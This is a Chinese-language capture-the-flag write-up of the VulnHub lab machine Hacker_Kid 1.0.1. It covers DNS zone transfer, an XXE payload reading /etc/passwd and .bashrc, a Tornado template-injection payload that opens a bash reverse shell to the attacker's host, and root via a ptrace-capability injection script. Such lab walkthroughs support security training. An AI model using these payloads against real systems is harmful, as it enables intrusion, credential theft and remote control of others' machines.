# **第七周**

**靶机名称**:vulnhub------**Hacker_Kid-v1.0.1**

**靶机链接**:https://www.vulnhub.com/entry/hacker-kid-101,719/

**难度**:Easy/Medium (Intermediate)

**攻击机**:Kali Linux

**使用工具**:dig

**强烈推荐教程**:[我们一起来打靶](https://pqy.h5.xeknow.com/s/2svbaU)

![推广](https://tva1.sinaimg.cn/large/008i3skNly1gum9cnlujvj30ku112ad0.jpg)

## 简述

本周的靶机是OSCP风格的靶机,我们会学习到很多新的攻击方式

DNS区域传输(AXFR)

XXE注入攻击

SSTI模版注入

Capabilities提权

在每一步的攻击过程中,作者都会给予我们提示

**~Enjoy~**

## 信息收集

### 主机发现

`sudo arp-scan -l`

![截屏2021-09-19 下午5.58.49](https://tva1.sinaimg.cn/large/008i3skNly1gum3akbuonj61100c8n1802.jpg)

发现主机`10.0.0.38`

### 端口扫描

`sudo nmap -p- 10.0.0.38`	

我们发现它开放了53,80,9999.再进一步进行服务版本扫描

`sudo nmap -p53,80,9999 -sV 10.0.0.38 `

![截屏2021-09-20 上午11.28.53](https://tva1.sinaimg.cn/large/008i3skNly1gumxn2sjy6j60v20b4acx02.jpg)

可以看到53开放了 domain服务,也就是dns域名解析服务

我们都知道,dns常常是使用udp进行域名查询的,但为什么这里用的是tcp呢

原来,dns的tcp端口常用于两台dns服务器之间进行数据传输、同步等操作.

而dns的udp端口用于常向用户提供域名解析服务

而nmap默认只扫描tcp端口,所以我们需要指定让它进行udp端口扫描

`sudo namp -p53 -sU 10.0.0.38`

果然,53的udp端口是打开的~

80端口依旧是我们熟悉的Apache,OS为Ubuntu

而9999端口出现了一个神奇的服务,**Tornado**.看后面的httpd看起来应该是个web服务~

至于Tornado是什么?我们暂且卖个关子~~

## web页面

依照惯例,我们先对web页面进行信息收集~

![截屏2021-09-19 下午8.13.22](https://tva1.sinaimg.cn/large/008i3skNly1gum76i46ebj61140u077m02.jpg)

可以看到,这是一个“小屁孩黑客”的故事~我们要想办法黑进去!

看到下面的一行字,DIG这个单词大写了~

我们都知道,dig是一款非常强大的域名挖掘工具,再结合之前发现的dns服务.嗯~意味深长呢~~

但是呢,dig需要指定一个域名才能进行挖掘.真可惜,等我们有域名再说吧...

### 揭开web的面纱

仅仅只是这样,我们好像获取不到更多的信息了..

我们尝试点击一下其他的功能点,但是经过探索后好像都没有什么发现

不要忘记了,我们还可以查看页面的源代码!

![截屏2021-09-19 下午8.17.49](https://tva1.sinaimg.cn/large/008i3skNly1gum7b42hb1j30we0c80uf.jpg)

在开发过程中,开发人员往往会忘记把敏感信息的注释删除,我们可以获得很多信息!

看来我们可以用GET命令请求page_no参数~

我们可以使用burpsuite,使用intruder模块进行攻击~

但是这里我还要介绍另外一个方法~

由于这只是简单的参数爆破,杀鸡焉用牛刀?

对于数量较大的爆破情况,使用ffuf的速度会更快哦~

我们使用上一次的ffuf工具进行爆破

首先使用`crunch 1 3 0123456789 -o num.dic`生成0~999的数字,作为参数字典

再使用`ffuf -w num.dic -u http://10.0.0.38/?page_no=FUZZ -fs 3654 `进行Fuzz

*ps:3654的大小可以通过`curl -v http://10.0.0.38/?page_no=1`获得默认数据包大小*

![截屏2021-09-19 下午8.27.26](https://tva1.sinaimg.cn/large/008i3skNly1gum7l4zrplj61a80ny79d02.jpg)

可以看到,当page_no为21时,返回了不一样的数据包~

我们打开浏览器康康吧

![截屏2021-09-19 下午8.29.21](https://tva1.sinaimg.cn/large/008i3skNly1gum7n23tmjj615t0u0gpw02.jpg)

果然多了一点东西.下面的三行红字说:“我创建了一个子域名当后门,其中一个是`hackers.blackhat.local`”

我们就来研究一下这个域名吧~

## 神奇的域名

`hackers.blackhat.local`

我们先把域名和ip在/etc/hosts下建立映射关系~

![截屏2021-09-19 下午8.32.26](https://tva1.sinaimg.cn/large/008i3skNly1gum7qb2vznj60pa04cjrw02.jpg)

*Ps:上次Chronos的靶机记录居然还留着:P*

这样一来,当我们访问这个域名时就可以访问真实的靶机了~

*ps:为什么要绑定域名?**请看附录:绑定域名的意义***

![截屏2021-09-19 下午8.38.56](https://tva1.sinaimg.cn/large/008i3skNly1gum7x3j8flj615t0u0n0q02.jpg)

奇怪,好像没变化?

仔细看看页面,**DIG**!!!

别忘了,我们现在有域名啦!

这个域名看起来像是本地的域名,应该只能通过靶机的dns服务器进行解析.

`dig axfr @10.0.0.38 blackhat.local`

解释一下命令

`axfr`发起axfr请求

axfr请求常用于主、从dns服务器之间同步数据.发送axfr请求后,主dns会把指定区域(顶级域)下的所有解析记录返回.

一般来说,axfr请求应仅限于从dns服务器向主dns服务器之间,但是由于错误的配置导致任何人都可以获得指定区域下的所有解析记录.这种漏洞叫做**DNS区域传输漏洞**

`@10.0.0.38`用于指定dns服务器

`blackhat.local`为顶级域名,也就是**指定区域**

![截屏2021-09-20 上午11.22.28](https://tva1.sinaimg.cn/large/008i3skNly1gumxgdwzdej61gc0jcwke02.jpg)

可以看到,我们获得了很多CNAME和A记录.

我们把hackerkid.blackhat.local和mail.blackerhat.local这两个记录添加到hosts文件中~

![截屏2021-09-20 上午8.44.34](https://tva1.sinaimg.cn/large/008i3skNly1gumsw46uszj611h0u0ju202.jpg)

果然!出现了一个新功能!

我们打开burpsuite辅助分析~

![截屏2021-09-20 上午8.48.13](https://tva1.sinaimg.cn/large/008i3skNly1gumszyajr7j61140u078i02.jpg)

咦?我们填的email有问题?

再试试其他的呢

还是不行!

奇怪了,这里不管填写什么邮箱都会被直接返回,并被指出邮箱不可用

我们再看看传输的格式——xml~

看到xml,我们就不得不谈谈xxe注入.

### 快乐xxe

它的原理和xss很像,都是因为服务端没有过滤用户的输入,导致奇奇怪怪的内容被输出.但xss针对的是客户端,而xxe针对的是服务端.

恶意的xxe实体经过服务端的xml解析后可能会返回一些敏感文件,造成任意文件读漏洞!

这就是xxe——xml外部实体注入漏洞

我们送上一个简单的payload

```xml-dtd
<!DOCTYPE  test [
	<!ENTITY file SYSTEM "file:///etc/passwd">
]>

<a>&file;</a>
```

![截屏2021-09-20 上午9.08.52](https://tva1.sinaimg.cn/large/008i3skNly1gumtldfqkhj61140u0qah02.jpg)

成功了!果然有xxe漏洞!

我们查看普通用户,`saket`

我们尝试读取一下saket的ssh密钥~

嗯?好像没有

那现在我们要读什么呢?

我们都知道,一般的linux账户下都会有几个默认文件,比如.bash_history,.bashrc等等~

.bashrc为bash的配置文件

我们能读多少来多少,看看.bashrc吧

注意:由于直接读取.bashrc文件会被解析,所以我们使用上次用的php封装器进行base64加密后再读取

![截屏2021-09-20 上午11.24.04](https://tva1.sinaimg.cn/large/008i3skNly1gumxi1nijij616n0u0agl02.jpg)

![截屏2021-09-20 上午11.26.03](https://tva1.sinaimg.cn/large/008i3skNly1gumxk3ouepj60n604eweu02.jpg)

芜湖~神奇的小密码出现了~

但是要在哪里登录呢?

## 9999端口

我们再去9999端口看一看吧

![截屏2021-09-20 上午11.37.42](https://tva1.sinaimg.cn/large/008i3skNly1gumxw8zxhuj616n0u0jtv02.jpg)

wow~正好是个登陆界面

我们用`admin/Saket!#$%@!!`作为账号密码尝试登陆~

![截屏2021-09-20 上午11.39.02](https://tva1.sinaimg.cn/large/008i3skNly1gumxxlmp9bj60ju02waa802.jpg)

出乎意料的,失败了..

为啥啊?不应该啊?!我百思不得其解...

但是仔细想想,密码是`Saket!#$%@!!`,这种难度的密码实在不像是一个假密码.而其中sakey又是一个用户名,`admin`用户名又感觉很假...

要不用`saket/Saket!#$%@!!`试试?

![截屏2021-09-20 上午11.41.15](https://tva1.sinaimg.cn/large/008i3skNly1gumxzyd5suj616n0u0dib02.jpg)

成功了!!!

### 🌸你的名字🌸

登录进来以后,一下子就是一个黑漆漆的窗口

让我告诉他我的名字?

怎么告诉呢?

我尝试翻看页面源代码,但是这次就没有那么幸运了,没有发现像之前那样的注释,让我们提交get参数....

咦?get参数??!!

是啊!我们用get提交一下name参数试试!

![截屏2021-09-20 上午11.44.11](https://tva1.sinaimg.cn/large/008i3skNly1gumy2yz2axj616n0u076n02.jpg)

芜湖~果然是这样!页面终于有了变化!

可是...现在该怎么办呢...

### SSTI模版注入

别着急,我们之前通过信息收集获取到了一些有趣的东西

9999端口:tornado服务

我们百度一下tornado

tornado是python的一套轻量级web框架.

我们输入名字,它都会显示在`Hello`后边,位置是固定的,就像是模板一样...

模版?我们试试模版注入~

测试payload:`{{1+abcxyz}}${1+abcxyz}<%1+abcxyz%>[abcxyz]`

SSTI的原理和sql注入差不多,都是因为服务端没有限制用户的输入导致任意的内容被解析执行

详情请看:https://www.jianshu.com/p/aef2ae0498df

![截屏2021-09-20 下午5.53.30](https://tva1.sinaimg.cn/large/008i3skNly1gun8rccry8j61140u0gpq02.jpg)果然报错了!仔细看看,这是tornado的模版注入漏洞,我们编写一个payload执行python反弹shell代码!

`{% import os %}{{os.system('bash -c "bash -i >& /dev/tcp/10.0.0.200/4444 0>&1"')}}`

我们使用这条指令向kali的4444端口反弹shell!

注意哦,内容要先经过url编码再提交!

`%7B%25%20import%20os%20%25%7D%7B%7Bos.system('bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.0.0.200%2F4444%200%3E%261%22')%7D%7D`

![截屏2021-09-20 下午5.58.43](https://tva1.sinaimg.cn/large/008i3skNly1gun8woc9mxj617o04qmy302.jpg)

收获普通shell!

## 提权

再接再厉,我们还是老三样,uname -a,sudo -l,suid

![截屏2021-09-20 下午6.08.11](https://tva1.sinaimg.cn/large/008i3skNly1gun96jsd5fj61e407ggna02.jpg)

版本很新,看来上次的“ubuntu大杀器”也是无能为力了

我们介绍一种新的提权方法

### Capabilities

我们作为一个普通用户,想要使用root权限做事,就会用到sudo

我们想要一个程序以其创建者的权限执行,于是用了suid

同样的,Capabilities是linux中的一种权限管理方式,这就像是suid一样,是程序的标识

就比如我们使用wireshark,需要用到底层的网络管理功能,往往需要root权限,但是它又只需要关于网络的权限,而不是所有的root权限.于是我们就给wireshark关于网络的capability标识,这就把权限十分细致的划分开来了!

使用命令`gatcap / -r`

![截屏2021-09-20 下午6.12.22](https://tva1.sinaimg.cn/large/008i3skNly1gun9au96izj61eq070q5a02.jpg)

这就是为什么我们不加上`2>/dev/null`的原因.有时候执行命令加上了这一句,反而不知道问题出在哪,各位留个心眼吧!

我们使用`/sbin/getcap / -r 2>/dev/null`查找拥有capabilities的机器

![截屏2021-09-20 下午6.18.07](https://tva1.sinaimg.cn/large/008i3skNly1gun9gu3hjjj61d206gwgh02.jpg)

好像都没有什么特殊的...除了python的这一条!

`cap_sys_ptrace+ep`,我们搜一下~

![截屏2021-09-20 下午6.21.15](https://tva1.sinaimg.cn/large/008i3skNly1gun9k3qgmyj61be0j4q6m02.jpg)

学会运用搜索引擎是多么重要啊!

大家一定要学会多搜索,多思考~

我们使用inject.py脚本进行注入

`python2.7 inject.py PID`

这里的PID应为以root权限运行的程序PID

我们输入`ps -aux | grep root`

如果成功后会开启5600端口作为shell

![截屏2021-09-20 下午6.29.51](https://tva1.sinaimg.cn/large/008i3skNly1gun9t1o7vnj60ki04ut9q02.jpg)

![截屏2021-09-20 下午6.30.20](https://tva1.sinaimg.cn/large/008i3skNly1gun9tj10agj60i403w0su02.jpg)

PWN!成功啦~

## 总结

在本周的打靶过程中,我们学习到了很多不一样的姿势~

首先基本的主机发现、端口扫描...

我们发现了不一般的dns服务~

在web界面上,我们通过观察注释发现了靶机的域名,并通过页面上的提示使用dig工具进行挖掘

最后我们发现了axfr-dns区域传输漏洞,获得了很多二级域名

我们在`hackerkid`这个二级域名中发现了不一样的注册页面,通过burp分析后发现emial参数提交的内容都会原封不动的返回回来,同时传输的方式是以xml格式传输的.所以我们就想到了xxe,通过尝试后成功获得/etc/passwd文件,发现了用户saket!

这时,我们似乎陷入了一个瓶颈期.始终记住:信息收集是最重要的!我们通过php封装器读取.bashrc文件,发现了账号与密码,但是账号是不匹配的,通过更改用户名,我们在9999端口成功登陆!

这时,网站询问我们的名字~我们结合前面的思路发现name参数,发现内容是以模版化输出的

想到端口扫描时发现的tornado服务,我们尝试使用SSTI模版注入payload进行测试,果然不出所料,报错了!

接下来,我们通过SSTI成功获取saket用户的shell~

进入靶机后,我们尝试进行“老三样”提权,结果失败了...我们通过新方法capabilities成功发现python2.7的异常配置,通过搜索引擎发现现成的提权脚本,成功获取root权限!

最后一句,搜索引擎,yyds!

## 附录

### 补充--绑定域名的意义

有人可能会想,我们绑定不绑定域名不都是向着同一个ip进行访问吗,这样做有区别吗?

有!

通常来说,我们要想访问一个主机的不同网站,有2种方法

1.把不同的网站运行在不同的端口上

2.把不同的网站运行在不同的子域名上

相同点是:都只有一台主机(一个ip地址)

特殊的,方法2是通过域名来识别服务的.一般来说,我们访问一个顶级域名,如果不加主机头,可能会被指定到www上

但是,其实我们也可以通过指定主机头(二级域名)来访问不同的网站~

比如:www.123.com和mail.123.com.虽然顶级域名是一样的,但是主机头不一样,这就导致请求的网站也不一样

同时,网站可能会进行一些检测,如果**不是通过域名访问的请求会被禁止**(不能使用ip进行请求)

所以,我们绑定域名其实是很有意义的!

### 查找Capabilities

`getcap / -r 2>/dev/null`

`-r`的意思是**递归查询**

介绍:https://man7.org/linux/man-pages/man7/capabilities.7.html

### inject.py文件

见文件

### SSTI介绍

https://www.jianshu.com/p/aef2ae0498df

### XXE介绍

https://blog.csdn.net/bylfsj/article/details/101441734

### 拓展阅读:

AXFR与SPF:https://www.cnblogs.com/piaomiaohongchen/p/10912022.html
